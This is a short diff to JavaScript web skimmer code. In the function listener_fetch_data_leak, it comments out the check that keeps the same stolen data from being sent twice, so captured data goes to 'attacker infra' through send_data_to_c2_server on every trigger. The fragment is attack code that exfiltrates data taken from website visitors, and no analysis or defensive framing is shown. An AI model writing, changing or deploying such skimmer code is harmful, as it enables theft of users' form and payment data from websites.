@@ -72,12 +72,13 @@ function listener_fetch_data_leak() {
         if (!key) return;
     }
 
-    // Prevent to do not send again previously sent data
+    /** Prevent to do not send again previously sent data
     var data_leak_hash = hashCode(data_leak);
     console.log("hash:"); console.log(data_leak_hash);
     console.log("previous hash:"); console.log(window["skimmer_last_data"]);
     if (data_leak_hash == window["skimmer_last_data"]) return;
     window["skimmer_last_data"] = data_leak_hash;
+    **/
 
     // Send data to attacker infra
     send_data_to_c2_server(data_leak);
